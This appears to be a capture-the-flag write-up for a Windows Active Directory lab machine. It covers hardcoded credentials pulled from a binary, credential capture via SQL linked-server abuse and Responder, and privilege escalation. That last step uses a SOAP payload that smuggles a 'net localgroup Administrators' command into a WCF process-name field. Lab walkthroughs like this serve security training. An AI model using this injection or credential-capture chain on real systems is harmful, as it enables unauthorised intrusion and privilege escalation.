Overwatch Writeup

Author: atrox | Tags: Active Directory, WCF, MSSQL, PetitPotam

Overview

Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service running as SYSTEM.

Enumeration

Credentials in the Binary

Running strings against overwatch.exe reveals a hardcoded SQL connection string:

Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;

Lateral Movement — Linked Server Abuse

By querying a linked server named SQL07 and spoofing DNS, we can capture cleartext credentials using Responder:

[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx

Privilege Escalation — WCF SOAP Injection

The WCF service exposes a KillProcess method vulnerable to command injection. We can use this to add our user to the local Administrators group:

# PowerShell SOAP Injection Payload
<KillProcess xmlns='http://tempuri.org/'>
    <processName>notepad; net localgroup Administrators sqlmgmt /add</processName>
</KillProcess>
Attack Chain: SMB → SQL Creds → Linked Server Abuse → WinRM → WCF Injection → SYSTEM
